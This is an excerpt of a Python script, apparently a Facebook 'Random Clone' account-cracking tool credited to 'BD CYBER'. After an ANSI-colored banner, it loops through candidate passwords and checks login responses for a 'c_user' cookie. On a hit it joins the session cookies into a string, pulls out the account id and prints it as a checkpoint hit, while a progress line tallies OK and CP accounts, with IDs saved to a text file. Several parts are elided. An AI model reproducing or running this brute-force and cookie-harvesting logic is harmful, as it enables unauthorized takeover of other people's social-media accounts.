...
\033[1;96.
 ...
 \033[1;32m|     \033[1;33m[✓] CREATED BY\33[0;m   :  \033[1;33mIBRAHIM ROHOMAN ALIF     \033[1;92m|
 \033[1;32m|     \033[1;32m[✓] FACEBOK      : \033[1;34m IBRAHIM rohoman ALIF                \033[1;92m|
 \033[1;32m|     \033[1;35m[✓] GITHUB       :  \033[1;35mBOSS___ALIF              \033[1;92m|
 \033[1;32m|     \033[1;36m[✓] TOOL STATUS  :  \033[1;36mRandom Clone          \033[1;92m|
 \033[1;32m|     \033[1;35m[✓] TEAM         :  \033[1;35mBD CYBER                   \033[1;92m|
...
def i():
    ...
    print('IDS SAVED IN LOVE.txt, LOVE.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;34mALIF-CP ] '+cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s[ALIF] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
